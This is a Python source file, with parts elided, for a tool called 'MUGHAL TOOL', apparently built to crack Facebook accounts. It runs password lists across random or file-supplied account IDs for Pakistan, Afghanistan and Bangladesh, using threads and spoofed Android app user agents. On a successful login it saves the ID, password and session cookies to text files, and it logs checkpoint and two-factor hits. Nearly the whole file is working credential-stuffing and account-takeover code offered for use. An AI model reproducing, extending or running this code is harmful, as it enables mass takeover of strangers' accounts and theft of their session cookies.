...
try:
    ...
    print('')
    #time.sleep(2)
    #os.system(f'xdg-open https://youtube.com/@tehseenqaisrani5113')
...
[•] \033[1;37mVERSION    :\033[1;32m 1.2\033[1;37m
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print('\t\x1b[1;92m        MUGHAL TOOL METHODS MENU')
                                linex()
                                ...
                                try:
                                        ...
                                        ps_limit =1
                                clear()
                                print('\t\x1b[1;92m     MUGHAL TOOL PASSWORD MENU')
                                linex()
                                ...
                                clear()
                                print('\t\x1b[1;92m  MUGHAL TOOL ACCOUNTS DISPLAY MENU')
                                linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\t\x1b[1;92m   MUGHAL TOOL FILE CRACMUGHAL MENU')
                                        linex()
                                        ...
                                        print('\033[0;97m[•]\x1b[1;92m MUGHAL TOOL CRACMUGHAL HAS BEEN STARTED')
                                        linex()
                                ...
                                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/MUGHAL-COOKIE.txt') 
                                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/MUGHAL-OK.txt')
                                linex()
                                input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear();menu()
                        elif xd in ['2','02']:
                                clear()
                                print('\t\x1b[1;92m   MUGHAL TOOL RANDOM CLONING MENU')
                                linex()
...
def pak():
                user=[]
                clear()
                print('\t\x1b[1;92m  MUGHAL TOOL PAK RANDOM CLONER MENU')
                linex()
                ...
                with tred(max_workers=30) as MUGHAL:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   MUGHAL TOOL RANDOM PAK CRACMUGHAL MENU')
                        linex()
...
def afg():
                user=[]
                clear()
                print('\t\x1b[1;92m  MUGHAL TOOL AFG RANDOM CLONER MENU')
                linex()
                ...
                with tred(max_workers=30) as MUGHAL:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   MUGHAL TOOL RANDOM AFG CRACMUGHAL MENU')
                        linex()
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
...
def bd():
                user=[]
                clear()
                print('    \x1b[1;92mMUGHAL TOOL BANGLADESH RANDOM  CLONER MENU')
                linex()
                ...
                with tred(max_workers=30) as MUGHAL:     
                        clear()
                        tl = str(len(user))
                        print('      \x1b[1;92mMUGHAL TOOL RANDOM BANGLADESH CRACMUGHAL MENU')
                        linex()
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mMUGHAL-M1\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in MUGHAL:
                                ...
                                print(f'\r\r\x1b[1;92m[\033[0;97mMUGHAL-OK\033[0;92m] \033[0;92m%s \033[0;97m| \033[0;92m%s'%(ids,pas))
                                open('/sdcard/MUGHAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/MUGHAL-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in MUGHAL:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;92m[\033[0;91mMUGHAL-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        ...
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mMUGHAL-M2\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                    ...
                    'user-agent': ua}
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\33[1;92m[\033[0;97mMUGHAL-OK\033[1;92m]\033[1;92m '+ids+'\033[1;37m | \033[1;32m'+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/MUGHAL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/MUGHAL-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\33[1;97m[\033[1;92mMUGHAL-2F\033[1;97m]\033[1;92m '+ids+' | '+pas)
                                                twf.append(ids)
                                                break                   
...
def api1(ids,names,passlist):
                try:
                        global ok,loop,proxies
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mMUGHAL-M3\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                    ...
                    'user-agent': ua}
                                ...
                                if 'session_key' in q:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        print('\r\r\x1b[1;92m[\033[0;97mMUGHAL-OK\033[0;92m]\033[1;92m '+ids+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/MUGHAL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/MUGHAL-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[\033[0;96mMUGHAL-OK\033[0;92m]\033[1;91m '+ids+' \033[1;37m|\033[1;31m '+pas+ ' '+joined(ids)+' ')
                                                twf.append(ids)
                                                break           
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mMUGHAL-CRACMUGHAL\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                    ...
                    'user-agent': ua}#'Mozilla/5.0 (Linux; Android 10; CPH2121 Build/RP1A.200720.010; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/358.0.0.34.117;]'}
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MUGHAL-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                                        print('\r\r\x1b[1;92m[\033[0;97mMUGHAL-OK\033[0;92m]\033[1;92m '+uid+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(uid)+' ')      
                                                        #print("Cookie: "+coki)
                                                        open('/sdcard/MUGHAL-rndm-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        open('/sdcard/MUGHAL-rndm-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\x1b[1;92m[\033[0;91mMUGHAL-CP\033[0;92m] \033[0;90m'+uid+' \033[0;97m|\033[0;90m '+pas+'\033[1;97m')
                                                open('/sdcard/MUGHAL-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                else:
                                        continue
